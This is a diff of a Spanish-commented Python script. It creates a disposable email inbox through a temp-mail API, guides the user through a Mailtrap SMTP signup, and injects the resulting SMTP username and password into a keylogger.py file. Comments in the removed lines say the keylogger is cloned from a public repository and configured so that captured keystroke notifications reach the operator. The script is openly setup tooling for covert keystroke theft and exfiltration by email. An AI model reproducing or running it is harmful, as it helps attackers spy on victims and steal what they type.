@@ -6,17 +6,15 @@ import string
 import time
 import re
 import webbrowser
-import subprocess
 
-# Los anteriores son los paquetes necesarios para que este script funcione correctamente.
-
-# Carga las claves necesarias.
-
+# Carga las claves necesarias desde .env
 load_dotenv()
 API_KEY = os.getenv("RAPIDAPI_KEY")
 AUTH_TOKEN = os.getenv("TEMPMAIL_TOKEN")
 
-# Encabezados para usar la API.
+if not API_KEY or not AUTH_TOKEN:
+    print("❌ Error: Las variables de entorno RAPIDAPI_KEY y TEMPMAIL_TOKEN deben estar definidas.")
+    exit(1)
 
 HEADERS = {
     "X-RapidAPI-Key": API_KEY,
@@ -24,93 +22,84 @@ HEADERS = {
     "X-RapidAPI-Host": "tempmail-so.p.rapidapi.com"
 }
 
-
-
-######################### Funcion para obtener un dominio #########################
-
 def get_domain():
-    # a la variable url se le asigna un string con la url de la pagina en este caso es domains 
     url = "https://tempmail-so.p.rapidapi.com/domains"
+    try:
+        res = requests.get(url, headers=HEADERS, timeout=10)
+        res.raise_for_status()
+        dominios = res.json().get("data")
+        if dominios and len(dominios) > 0:
+            return dominios[0]["domain"]
+        else:
+            print("❌ No se encontraron dominios disponibles.")
+            exit(1)
+    except Exception as e:
+        print(f"❌ Error al obtener dominios: {e}")
+        exit(1)
 
-    # a la variable res se le asigna una indicacion que en este caso es usar el modulo requests y con get obtener
-    # la url especificada en la variable anterior, y le dice que la variable headers es igual al diccionario
-    # creado anteriormente
-    res = requests.get(url, headers=HEADERS)
-
-    # Aqui a la variable dominios se le asigna lo que devuelve la peticion anterior y lo guarda en un archivo json.
-    dominios = res.json()["data"]
-
-    # Este devuelve el primero de los dominios disponibles
-    return dominios[0]["domain"]
-
-# Crear un nombre aleatorio
 def generar_nombre():
     return "user_" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
 
-# Crear el correo
 def crear_buzon(nombre, dominio):
     url = "https://tempmail-so.p.rapidapi.com/inboxes"
-    res = requests.post(url, headers=HEADERS, data={
-        "name": nombre,
-        "domain": dominio,
-        "lifespan": 600  # El correo dura 10 minutos
-    })
-    return res.json()["data"]["id"]
+    try:
+        res = requests.post(url, headers=HEADERS, data={
+            "name": nombre,
+            "domain": dominio,
+            "lifespan": 600
+        }, timeout=10)
+        res.raise_for_status()
+        return res.json()["data"]["id"]
+    except Exception as e:
+        print(f"❌ Error al crear buzón: {e}")
+        exit(1)
 
-# Leer bandeja de entrada
 def leer_bandeja(inbox_id):
     url = f"https://tempmail-so.p.rapidapi.com/inboxes/{inbox_id}/mails"
-    res = requests.get(url, headers=HEADERS)
-    return res.json()["data"]
+    try:
+        res = requests.get(url, headers=HEADERS, timeout=10)
+        res.raise_for_status()
+        return res.json().get("data", [])
+    except Exception as e:
+        print(f"❌ Error al leer bandeja: {e}")
+        return []
 
-# Leer contenido de un correo específico
 def leer_mensaje(inbox_id, mail_id):
     url = f"https://tempmail-so.p.rapidapi.com/inboxes/{inbox_id}/mails/{mail_id}"
-    res = requests.get(url, headers=HEADERS)
-    if res.status_code == 200:
-        return res.json()["data"]
-    else:
-        print("❌ Error al leer mensaje:", res.status_code)
+    try:
+        res = requests.get(url, headers=HEADERS, timeout=10)
+        res.raise_for_status()
+        return res.json().get("data", {})
+    except Exception as e:
+        print(f"❌ Error al leer mensaje: {e}")
         return {}
-    
-# Extraer el enlace de el correo
+
 def extraer_primer_enlace(texto):
     coincidencias = re.findall(r'https?://[^\s"\<>]+', texto)
     return coincidencias[0] if coincidencias else None
 
-# Guarda las credenciales que usaran para modificar el archivo keylogger.
 def save_credentials(USERNAME, PASSWORD, MAILTRAP_KEY=".env"):
-    with open(MAILTRAP_KEY, "a") as f:
-        f.write(f"USERNAME={USERNAME}\n")
-        f.write(f"PASSWORD={PASSWORD}\n")
-        print(f"✅ Credenciales guardadas en {MAILTRAP_KEY}")
-
-# Descarga el repositorio del keyloger que usaremos. 
-def clonar_repo(repo_url, destino="repositorio_clonado"):
-    if os.path.exists(destino):
-        print(f"El repositorio ya esta descargado en '{destino}'.")
-        return
     try:
-        subprocess.run(["git", "clone", repo_url, destino], check=True)
-        print(f"✅ Repositorio clonado en: {destino}")
-    except subprocess.CalledProcessError as e:
-        print("❌ Error al clonar el repositorio:", e)
+        with open(MAILTRAP_KEY, "a", encoding="utf-8") as f:
+            f.write(f"USERNAME={USERNAME}\n")
+            f.write(f"PASSWORD={PASSWORD}\n")
+        print(f"✅ Credenciales guardadas en {MAILTRAP_KEY}")
+    except Exception as e:
+        print(f"❌ Error al guardar credenciales: {e}")
 
-# Configuracion del archivo keylogger.py.
-def modificar_keylogger(nuevo_usernmae, nuevo_password):
-    with open("keylogger/keylogger.py", "r") as f:
-        contenido = f.read()
+def modificar_keylogger(nuevo_username, nuevo_password):
+    ruta = "keylogger/keylogger.py"
+    try:
+        with open(ruta, "r", encoding="utf-8") as f:
+            contenido = f.read()
+        contenido = contenido.replace("YOUR_USERNAME", nuevo_username)
+        contenido = contenido.replace("YOUR_PASSWORD", nuevo_password)
+        with open(ruta, "w", encoding="utf-8") as f:
+            f.write(contenido)
+        print("✅ Archivo keylogger.py actualizado con las nuevas credenciales.")
+    except Exception as e:
+        print(f"❌ Error al modificar keylogger.py: {e}")
 
-
-    contenido = contenido.replace("YOUR_USERNAME", nuevo_usernmae)
-    contenido = contenido.replace("YOUR_PASSWORD", nuevo_password)
-
-    with open("keylogger/keylogger.py", "w") as f:
-        f.write(contenido)
-
-    print((f"✅ Archivo actualizado con las nuevas credenciales."))
-
-# MAIN
 def main():
     dominio = get_domain()
     nombre = generar_nombre()
@@ -123,60 +112,43 @@ def main():
 
     inbox_id = crear_buzon(nombre, dominio)
 
-    print("⌛ Esperando mensaje... (hasta 2 minuto)")
-    for i in range(24):  # 24 x 5 segundos = 120 segundos = 2 minutos
+    print("⌛ Esperando mensaje... (hasta 2 minutos)")
+    for i in range(24):
         mensajes = leer_bandeja(inbox_id)
         if mensajes:
             print(f"✅ ¡Tienes {len(mensajes)} mensaje(s)!")
             for mensaje in mensajes:
-                print("\n📧 Asunto:", mensaje["subject"])
-                print("🧑‍💻 De:", mensaje["from"])
+                print("\n📧 Asunto:", mensaje.get("subject"))
+                print("🧑‍💻 De:", mensaje.get("from"))
 
-            # Obtener el ID del correo para leer su contenido completo
                 mail_id = mensaje["id"]
-                detalle = leer_mensaje(inbox_id, mensaje["id"])
+                detalle = leer_mensaje(inbox_id, mail_id)
 
                 texto = detalle.get("textContent") or detalle.get("htmlContent") or "[Sin contenido]"
-                print("📝 Vista previa real:\n", texto[:300])  # Muestra los primeros 300 caracteres
-                
-                # Si quieres leer todo el mensaje
+                print("📝 Vista previa real:\n", texto[:300])
                 print("\n🔍 Contenido completo:\n", texto)
 
-                # Extrae el enlace y lo abre en el navegador.
                 enlace = extraer_primer_enlace(texto)
-
                 if enlace:
                     print(f"\n🔗 Enlace encontrado: {enlace}\n")
                     print("\n🌐 Abriendo enlace de verificación en el navegador...\n")
                     webbrowser.open(enlace)
-                    
 
-                    # Espera a que el usuario confirme manualmente.
-                    input(f"🛑 Cuando hayas confirmado el correo y hayas iniciado sesion en la página con:\n \nCorreo: {correo}\nContraseña: (contraseña que usaste en la pagina)\n\nPresiona 'Enter' para continuar... ")
-                    input("Ahora termina el registro agregando la informacion que te pide, y cuando la pagina te pregunte que producto usaras, presionas la opcion que dice 'Email API/SMTP', y el dominio lo dejas tal como esta, Una vez echo eso Presiona 'Enter'... ")
-                    input("Ahora ya en la pagina de inicio, ve a la parte izquierda donde esta el menu y presiona 'Sandbox' en 'My Project' presiona 'My Sandbox' y en la pestaña integracion estan las credenciales que necesitas, Presiona 'Enter' para continuar... ")
-                        
-                    # guarda las credenciales en un archivo llamado mailtrap.env
+                    input(f"🛑 Cuando hayas confirmado el correo y hayas iniciado sesión en la página con:\n\nCorreo: {correo}\nContraseña: (contraseña que usaste en la página)\n\nPresiona 'Enter' para continuar... ")
+                    input("Ahora termina el registro agregando la información que te pide, y cuando la página te pregunte qué producto usarás, selecciona 'Email API/SMTP', dejando el dominio tal cual está. Presiona 'Enter' cuando hayas terminado... ")
+                    input("Ahora en la página de inicio, ve a 'Sandbox' en 'My Project', luego 'My Sandbox' y en la pestaña de integración están las credenciales que necesitas. Presiona 'Enter' para continuar... ")
+
                     EMAIL_ADDRESS = input("Escribe el USERNAME de las credenciales SMTP: ").strip()
-                    PASSWORD_ADDRESS = input("Escribe el PASSWORD de las credenciales de SMTP ").strip()
+                    PASSWORD_ADDRESS = input("Escribe el PASSWORD de las credenciales SMTP: ").strip()
 
                     save_credentials(EMAIL_ADDRESS, PASSWORD_ADDRESS)
-
-                    # clona el repositorio del keylogger.
-                    clonar_repo("https://github.com/aydinnyunus/Keylogger.git", "keylogger")
-
-                    # modifica las lineas de USERNAME y PASSword para que nos lleguen las notificaciones a nosotros.
                     modificar_keylogger(EMAIL_ADDRESS, PASSWORD_ADDRESS)
-
-                    print("\nVerifica que el archivo keylogger.py se haya modificado correctamente...\n")
-
-
+                    print("\nVerifica que el archivo keylogger.py se haya modificado correctamente.\n")
                 else:
                     print("⚠️ No se encontró ningún enlace en el mensaje.")
-
             break
         else:
-            print(f"⏳ Esperando... ({(i+1)*5}s)")
+            print(f"⏳ Esperando... {(i+1)*5}s")
             time.sleep(5)
     else:
         print("😞 No llegó ningún mensaje.")
